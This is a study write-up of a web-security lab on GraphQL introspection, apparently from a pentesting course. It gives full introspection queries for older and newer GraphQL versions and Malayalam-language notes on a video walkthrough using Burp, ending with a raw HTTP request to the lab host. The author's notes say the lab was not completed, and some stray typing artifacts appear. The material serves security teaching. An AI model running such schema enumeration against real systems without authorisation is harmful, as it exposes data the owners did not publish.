## Objective
-->This exercise covers how to use introspection to get access to additional information in GraphQL.
-->This course details how you can use GraphQL Introspection to find data that may not be exposed directly by an application.
-->If you want to do it by yourself, you can follow the following steps:
-   Find the [GraphiQL](https://github.com/graphql/graphiql) endpoint, to be able to easily send a GraphQL query.
-   Lookup how to use GraphQL Introspection.
-   Find the hidden data to get the key to solve this exercise.

## GraphQL
-->GraphQL is similar to SQL in that it is a standard to request and organize data (as opposed to MySQL that is a product that uses the standard SQL).
-->When coming across a new standard/product/technology, it's always a good idea to go through the "Introduction" course/tutorial that may be available.
-->For example, for GraphQL, you can read [Introduction to GraphQL](https://graphql.org/learn/).

## Detection of the issue
-->First, you will need to look at the traffic sent to the server when accessing the projects link.
-->You should see a query to a /graphql/ endpoint.
-->Here, the frontend graphiql is available, so you should find a web based IDE when you browse to the endpoint.
-->GraphQL offers an easy way to view metadata about the information available.
-->This is very similar to the information_schema tables in modern databases. It helps users know what is available.
-->However, this has a security impact as it may allow attackers to get access to information that may not otherwise be exposed.
-->This can be referred to as "security by obscurity".
-->Depending on the version of the GraphQL standard, you can use one of the following queries:<./p>
-->For older versions:
```typescript
query IntrospectionQuery {
	    __schema {
	      queryType { name }
	      mutationType { name }
	      subscriptionType { name }
	      types {
	        ...FullType
	      }
	      directives {
	        name
	        description
	        args {
	          ...InputValue
	        }
	        onOperation
	        onFragment
	        onField
	      }
	    }
	  }
	 
	fragment FullType on \_\_Type {
	kind
	name
	description
	fields(includeDeprecated: true) {
	name
	description
	args {
	...InputValue
	}
	type {
	...TypeRef
	}
	isDeprecated
	deprecationReason
	}
	inputFields {
	...InputValue
	}
	interfaces {
	...TypeRef
	}
	enumValues(includeDeprecated: true) {
	name
	description
	isDeprecated
	deprecationReason
	}
	possibleTypes {
	...TypeRef
	}
	}
	 
	fragment InputValue on \_\_InputValue {
	name
	description
	type { ...TypeRef }
	defaultValue
	}
	 
	fragment TypeRef on \_\_Type {
	kind
	name
	ofType {
	kind
	name
	ofType {
	kind
	name
	ofType {
	kind
	name
	}
	}
	}
	}
```

-->For more recent versions:
```typescript
query IntrospectionQuery {
	    __schema {
	      queryType { name }
	      mutationType { name }
	      subscriptionType { name }
	      types {
	        ...FullType
	      }
	      directives {
	        name
	        description
	        args {
	          ...InputValue
	        }
	        locations
	      }
	    }
	  }
	 
	  fragment FullType on __Type {
	    kind
	    name
	    description
	    fields(includeDeprecated: true) {
	      name
	      description
	      args {
	        ...InputValue
	      }
	      type {
	        ...TypeRef
	      }
	      isDeprecated
	      deprecationReason
	    }
	    inputFields {
	      ...InputValue
	    }
	    interfaces {
	      ...TypeRef
	    }
	    enumValues(includeDeprecated: true) {
	      name
	      description
	      isDeprecated
	      deprecationReason
	    }
	    possibleTypes {
	      ...TypeRef
	    } 
	  }   
	      
	  fragment InputValue on __InputValue {
	    name
	    description
	    type { ...TypeRef }
	    defaultValue
	  }     
	        
	  fragment TypeRef on __Type {
	    kind
	    name
	    ofType {
	      kind
	      name
	      ofType {
	        kind
	        name
	        ofType {
	          kind
	          name
	        }
	      }
	    } 
	  }       
```
-->The only difference being the move from onOperation, onFragment and onFields to locations.
asdfasdf
-->To get in more details, we use `__schema` to get more information about the data available. Then we ask for more information.
-->The most important part is to ask for types and look at everything with the name Query ("name": "Query"):
```typescript
	query MyQuery {
	   __schema {
	    types {
	      name
	      fields {
	       name
	      } 
	    
	    }
	  }
	}
```
-->Using one of these queries, you should get a list of queries that you can run in place of the getprojects, used by the application.
-->One of the queries should give you access to the key to solve this exercise.
```typescript
	query Query {
	  [NAME] {
	    id
	  }
	}  
```
-->where [NAME] is the name of the query. For example, with projects:
```typescript
	query Query {
	  projects {
	    id
	  }
	}
```

## Conclusion
-->This exercise showed you how you can use GraphQL Introspection to get access to information that is not necessarily exposed by the application.
-->Then you manage to write your own GraphQL query to get access to this data.
-->It's very common that storage and query mechanisms offer a way to get metadata about the information available, it is always a wise idea to see if there is more data being exposed by the application.


# Video Explanation
## Video - GraphQL Exploitation
-->so lab open chyuka enit athil projects enna button click chyuka apol namuk korach details kitum
-->ini burp il poi nokiyal kanam /POST /graphql   ennan. so graphql use chythan databse il ninum sathanam retrieve chyunath :
```typescript
{"operationName":"projects","variables":{"offset":10},"query":"query projects($offset: Int) {\n  projects(offset: $offset, limit: 10) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"}
```
-->so ini theroy part il namal graphql inte older/new versions in anusarich graphql inte payload set chythitund.so atheduth ee grahpql query yile offset kazhinjulla "query": "ivide paste chyanam"  enit send adikumbol namuk error varum ie, invalid json enn.so vim il poi namuk aadyam ath paste chyam enit ee command adikam ie,->`:%s /\n/\\n/` apol new line oke correct aline aayi result kitum


```typescript
"query IntrospectionQuery {\n	    __schema {queryType { name }\n	      mutationType { name }\n	      subscriptionType { name }\n	      types {\n	        ...FullType\n	      }\n	      directives {\n	        name\n	        description\n	        args {\n	          ...InputValue\n	        }\n	        locations\n	      }\n	    }\n	  }\n	 \n	  fragment FullType on __Type {\n	    kind\n	    name\n	    description\n	    fields(includeDeprecated: true) {\n	      name\n	      description\n	      args {\n	        ...InputValue\n	      }\n	      type {\n	        ...TypeRef\n	      }\n	      isDeprecated\n	      deprecationReason\n	    }\n	    inputFields {\n	      ...InputValue\n	    }\n	    interfaces {\n	      ...TypeRef\n	    }\n	    enumValues(includeDeprecated: true) {\n	      name\n	      description\n	      isDeprecated\n	      deprecationReason\n	    }\n	    possibleTypes {\n	      ...TypeRef\n	    } \n	  }   \n	      \n	  fragment InputValue on __InputValue {\n	    name\n	    description\n	    type { ...TypeRef }\n	    defaultValue\n	  }     \n	        \n	  fragment TypeRef on __Type {\n	    kind\n	    name\n	    ofType {\n	      kind\n	      name\n	      ofType {\n	        kind\n	        name\n	        ofType {\n	          kind\n	          name\n	        }\n	      }\n	    } \n	  }     a\n"
```

ennekond ith correct chyan patunila.ith aakikazhinj namal query il idanam.apol namuk projects enna sathanam illa enna error kanikum. apolmukalil ulla `{"operationName":"projects","variables":{"offset":10},`   remove chyanam.apol graphql il enthoke unden kanikum.so ath noki namal enthan vendath ennu vechal ath eduth chyanam ok. 
-->ee lab therkanaengil aa graphql introspection correct json format il kitanam pakshe enik kitunila.so lab complete aakan patunila ok

-->request ingane aan :
```http
POST /graphql HTTP/1.1
Host: ptl-543d48df-4e718c2c.libcurl.so
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 1374
Origin: http://ptl-543d48df-4e718c2c.libcurl.so
Connection: close
Referer: http://ptl-543d48df-4e718c2c.libcurl.so/projects

{"operationName":"projects","variables":{"offset":10},"query":"query IntrospectionQuery {\n	    __schema {\n	      queryType { name }\n	      mutationType { name }\n	      subscriptionType { name }\n	      types {\n	        ...FullType\n	      }\n	      directives {\n	        name\n	        description\n	        args {\n	          ...InputValue\n	        }\n	        locations\n	      }\n	    }\n	  }\n	 \n	  fragment FullType on __Type {\n	    kind\n	    name\n	    description\n	    fields(includeDeprecated: true) {\n	      name\n	      description\n	      args {\n	        ...InputValue\n	      }\n	      type {\n	        ...TypeRef\n	      }\n	      isDeprecated\n	      deprecationReason\n	    }\n	    inputFields {\n	      ...InputValue\n	    }\n	    interfaces {\n	      ...TypeRef\n	    }\n	    enumValues(includeDeprecated: true) {\n	      name\n	      description\n	      isDeprecated\n	      deprecationReason\n	    }\n	    possibleTypes {\n	      ...TypeRef\n	    } \n	  }   \n	      \n	  fragment InputValue on __InputValue {\n	    name\n	    description\n	    type { ...TypeRef }\n	    defaultValue\n	  }     \n	        \n	  fragment TypeRef on __Type {\n	    kind\n	    name\n	    ofType {\n	      kind\n	      name\n	      ofType {\n	        kind\n	        name\n	        ofType {\n	          kind\n	          name\n	        }\n	      }\n	    } \n	  }\n"}
```